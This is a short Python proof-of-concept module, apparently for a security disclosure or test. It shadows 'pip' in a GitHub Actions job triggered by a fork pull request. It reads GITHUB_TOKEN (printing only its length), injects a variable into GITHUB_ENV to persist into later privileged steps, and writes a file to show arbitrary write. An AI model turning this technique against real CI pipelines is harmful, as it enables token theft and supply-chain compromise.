"""Simulates attacker-controlled module shadowing ``pip`` under ``python -m pip``."""
import os, sys

marker = "PIP_SHADOW_RCE"
print(f"{marker}: executed from cwd={os.getcwd()}")
tok = os.environ.get("GITHUB_TOKEN", "")
print(f"{marker}: token_present={bool(tok)} token_len={len(tok)}")
print(f"{marker}: actor={os.environ.get('GITHUB_ACTOR')} workflow={os.environ.get('GITHUB_WORKFLOW')} repo={os.environ.get('GITHUB_REPOSITORY')}")

# Persist into later steps of the privileged job.
env_path = os.environ.get("GITHUB_ENV")
if env_path:
    with open(env_path, "a", encoding="utf-8") as fh:
        fh.write("PWNED_BY_PIP_SHADOW=yes\n")
    print(f"{marker}: wrote GITHUB_ENV -> {env_path}")
else:
    print(f"{marker}: no GITHUB_ENV")

with open(os.path.join(os.getcwd(), "pwned.txt"), "w", encoding="utf-8") as fh:
    fh.write("arbitrary file write from fork PR\n")

sys.exit(0)
